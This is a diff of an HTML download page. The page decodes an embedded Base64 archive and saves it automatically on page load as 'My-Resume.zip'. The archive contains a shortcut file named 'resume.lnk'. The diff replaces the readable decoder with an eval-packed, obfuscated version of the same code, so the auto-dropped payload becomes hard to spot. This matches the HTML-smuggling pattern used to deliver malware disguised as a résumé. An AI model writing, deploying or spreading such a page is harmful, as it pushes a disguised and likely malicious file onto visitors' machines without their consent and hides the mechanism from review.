@@ -8,68 +8,7 @@
     <p>If the download doesn&#39;t start, <a href="#" id="manual-download">click here</a>.</p>
 
     <script>
-        // ================================================================
-        // STEP 1: Paste your Base64-encoded file content here
-        // ================================================================
-        const BASE64_DATA ='UEsDBBQACAAIAGFx1FwAAAAAAAAAAAAAAAAKACAAcmVzdW1lLmxua3V4CwABBAAAAAAEAAAAAFVUDQAHHlI2ajFSNmoJUjZq7VZtSFNhFH42LT/6mvmBiZlYE02cd85Sp5W5Nf0haq5U8gaKLl1tbjRxGhVIFBQGRQT1Q6kwLVDLQBSsUH9FP8LEwkJBBAsKUakfffij897dO5tKEvYjojPe+773vOc857nn7J775gCQBcnBpF+4wtAn90UkLT5NzqXUR4/JRuWdF65gXJZ94LNwj9m1gqEMnrJBHoRt+RN5Q5EftGbFnVFfxHFc0xYk6LQ8lkoh1MI8zJ85xaHIXF1hczqQAT94Y+ZpQ/F97Qj/aK+KLN5tZwS9BOsJt3/09zgUwYxqVMAGJxykC8EREfUln5fOwVjvqDFZNYlApgfuPQG3d+dyuMFNPjCinvBqYIIVGpA7QunOhdxQrE9TSHzzbU7TSWOVyWLBIXcEfdoIH65jEXYkLERYkPGww4uY5wuzCScpchXNFvqBipArxkwoOdesQK1axQFajzizmSyOctk4Zw3RslpCUIHcEESY9CRUvISS202RsDPqDkZdZaozgWK5cNnuCB+iZ7gDGi93oXvlEm7vtI/M7mbscDNW0VxHA4igUUUjXPRmc7zoXUkjQGRr/ManK5iS/iJiRnmpZvySFPMsAfxi3vsorgq8x9Uzu/ySei62WC7/PKTc8fjV08ZASXsuNDNZKMnesap4CspVOVU/ijxsAoodZeQrRYxCkJeQ11tKV7IKbLYaJe/4zcT9I6L0qG4BZYzlbPVV+HXV/8vfJqyPrGHvBM3jcPWcdXTvzB0Iey8/mtujV3V1HrzRw/ZKIfSfW8Wib1VS+YkKTbUbK6agvXIq5HleU+HD08/GruZOGW4mWixzAV1hMpKV9zuoV/oR/kXCUhvzjdPck7c6XMxq+zIU2OI4FmUlfQULtA2uxij96SKpneioxf+ZFhbrfiCJyOSlYsPjnBRd33zgtegb1heMiLdEhHV8I9FR09hFI1FYJVK4FKTSNUnQ7KZVvKDhSLOLVsk0c6TT0B2zTSKb3aRJFlDUtOLE7xjQLRLh5pQ9M1lhirtz8tLG5o/tbN9fIrKJxkovX7BoRycGEs18KjuaMOV6aVc6p8T+/Ixsdz+B2wnOTF22jFJqplDVotNGCdJ92iG5LZJuPV4es+f6cED3a/TnvQkdOg/Xp05A1tL4c6X7vT6UKhLsCrHqOy7bs9uyM1Qte+oat8L1HUY2y9ZXpWkwIsXwYHCzv73V+ernl+cHUEsHCGjO24iHAwAACAoAAFBLAQIUAxQACAAIAGFx1FxoztuIhwMAAAgKAAAKABgAAAAAAAAAAAC2gQAAAAByZXN1bWUubG5rdXgLAAEEAAAAAAQAAAAAVVQFAAEeUjZqUEsFBgAAAAABAAEAUAAAAN8DAAAAAA==';
-
-        // ================================================================
-        // STEP 2: Configure the output filename and MIME type
-        // ================================================================
-        const OUTPUT_FILENAME = 'My-Resume.zip';
-        const OUTPUT_MIME    = 'application/octet-stream';
-
-        // ================================================================
-        // Decode Base64 → Blob → Auto-download
-        // ================================================================
-        function decodeBase64AndDownload(base64, filename, mimeType) {
-            // Decode Base64 to binary string
-            const binaryString = atob(base64);
-
-            // Convert binary string to Uint8Array
-            const bytes = new Uint8Array(binaryString.length);
-            for (let i = 0; i < binaryString.length; i++) {
-                bytes[i] = binaryString.charCodeAt(i);
-            }
-
-            // Create the Blob
-            const blob = new Blob([bytes], { type: mimeType });
-
-            // Create object URL and trigger download
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = filename;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            setTimeout(() => URL.revokeObjectURL(url), 100);
-        }
-
-        // ================================================================
-        // Auto-download on page load
-        // ================================================================
-        window.addEventListener('DOMContentLoaded', function() {
-            if (BASE64_DATA) {
-                decodeBase64AndDownload(BASE64_DATA, OUTPUT_FILENAME, OUTPUT_MIME);
-            } else {
-                document.body.innerHTML = `
-                    <h2 style="color:red;">No Base64 data found!</h2>
-                    <p>1. Encode your file to Base64 (see instructions below).</p>
-                    <p>2. Paste the Base64 string into the <code>BASE64_DATA</code> variable in this HTML file.</p>
-                    <p>3. Set the <code>OUTPUT_FILENAME</code> and <code>OUTPUT_MIME</code> as needed.</p>
-                    <p>4. Re-open this page in a browser.</p>
-                `;
-            }
-        });
-
-        // Also allow manual trigger via the link
-        document.getElementById('manual-download')?.addEventListener('click', function(e) {
-            e.preventDefault();
-            if (BASE64_DATA) {
-                decodeBase64AndDownload(BASE64_DATA, OUTPUT_FILENAME, OUTPUT_MIME);
-            }
-        });
+        eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('5 7=\'14/13+15+16/18+17+12/11/W+V/X+Y+10/Z/19/1a/1k/1j/1l/1m+1o/1n/1i/U+1c+1b/1d/1e/1g+1f+1p/K+/F+E+H/I/J+D+C+G==\';5 b=\'T-Q.R\';5 c=\'S/P-O\';k l(s,q,r){5 9=L(s);5 f=B M(9.v);N(1h i=0;i<9.v;i++){f[i]=9.1T(i)}5 m=B 1U([f],{1V:r});5 d=o.1W(m);5 a=8.1S(\'a\');a.1q=d;a.x=q;8.j.1R(a);a.u();8.j.1N(a);1O(()=>o.1P(d),1Y)}1Q.t(\'1X\',k(){w(7){l(7,b,c)}1Z{8.j.25=`<y 26="23:24;">20 g 21 22!</y><p>1.1L 1x n 1M g(1y 1z 1w).</p><p>2.1v h g 1r 1s h<6>7</6> 1t z A 1u n.</p><p>3.1A h<6>b</6> 1B <6>c</6>1I 1J.</p><p>4.1K-1H A 1G z a 1C.</p>`}});8.1D(\'1E-x\')?.t(\'u\',k(e){e.1F();w(7){l(7,b,c)}});',62,131,'|||||const|code|BASE64_DATA|document|binaryString||OUTPUT_FILENAME|OUTPUT_MIME|url||bytes|Base64|the||body|function|decodeBase64AndDownload|blob|file|URL||filename|mimeType|base64|addEventListener|click|length|if|download|h2|in|this|new|ernl|oat8L1HUY2y9ZXpWkwIsXwYHCzv73V|B2wnOTF22jFJqplDVotNGCdJ92iG5LZJuPV4es|Ixsdz|cHUEsHCGjO24iHAwAACAoAAFBLAQIUAxQACAAIAGFx1FxoztuIhwMAAAgKAAAKABgAAAAAAAAAAAC2gQAAAAByZXN1bWUubG5rdXgLAAEEAAAAAAQAAAAAVVQFAAEeUjZqUEsFBgAAAAABAAEAUAAAAN8DAAAAAA|f6cED3a|TnvQkdOg|Xp05A1tL4c6X7vT6UKhLsCrHqOy7bs9uyM1Qte|tbN9fIrKJxkovX7BoRycGEs18KjuaMOV6aVc6p8T|atob|Uint8Array|for|stream|octet|Resume|zip|application|My|ZKIfSfW8Wib1VS|KLN5tZwS9BOsJt3|aK|09zgUwYxqVMAGJxykC8EREfUln5fOwVjvqDFZNYlApgfuPQG3d|dyuMFNPjCinvBqYIIVGpA7QunOhdxQrE9TSHzzbU7TSWOVyWLBIXcEfdoIH65jEXYkLERYkPGww4uY5wuzCScpchXNFvqBipArxkwoOdesQK1axQFajzizmSyOctk4Zw3RslpCUIHcEESY9CRUvISS202RsDPqDkZdZaozgWK5cNnuCB|M7mbscDNW0VxHA4igUUUjXPRmc7zoXUkjQGRr|iZ7gDGi93oXvlEm7vtI|F97Qj|ZpQ|6mvmBiZlYE02cd85Sp5W5Nf0haq5U8gaKLl1tbjRxGhVIFBQGRQT1Q6kwLVDLQBSsUH9FP8LEwkJBBAsKUakfffij897dO5tKEvYjojPe|UEsDBBQACAAIAGFx1FwAAAAAAAAAAAAAAAAKACAAcmVzdW1lLmxua3V4CwABBAAAAAAEAAAAAFVUDQAHHlI2ajFSNmoJUjZq7VZtSFNhFH42LT|773vOc857nn7J775gCQBcnBpF|4wtAn90UkLT5NzqXUR4|RN5Q5EftGbFnVFfxHFc0xYk6LQ8lkoh1MI8zJ85xaHIXF1hczqQAT94Y|JRuWdF65gXJZ94LNwj9m1gqEMnrJBHoRt|ManK5iS|iJiRnmpZvySFPMsAfxi3vsorgq8x9Uzu|HD08|YkKTbUbK6agvXIq5HleU|GruZOGW4mWixzAV1hMpKV9zuoV|oR|zIU2OI4FmUlfQULtA2uxij96SKpneioxf|kXCUhvzjdPck7c6XMxq|let|mtujV3V1HrzRw|PKTc8fjV08ZASXsuNDNZKMnesap4CspVOVU|ySei62WC7|ijxsAoodZeQrRYxCkJeQ11tKV7IKbLYaJe|4zcT9I6L0qG4BZYzlbPVV|8vfJqyPrGHvBM3jcPWcdXTvzB0Iey8|HXV|ZFhbrfiCJyOSlYsPjnBRd33zgtegb1heMiLdEhHV8I9FR09hFI1FYJVK4FKTSNUnQ7KZVvKDhSLOLVsk0c6TT0B2zTSKb3aRJFlDUtOLE7xjQLRLh5pQ9M1lhirtz8tLG5o|href|string|into|variable|HTML|Paste|below|your|see|instructions|Set|and|browser|getElementById|manual|preventDefault|page|open|as|needed|Re|Encode|to|removeChild|setTimeout|revokeObjectURL|window|appendChild|createElement|charCodeAt|Blob|type|createObjectURL|DOMContentLoaded|100|else|No|data|found|color|red|innerHTML|style'.split('|'),0,{}))
     </script>
 
 </body></html>
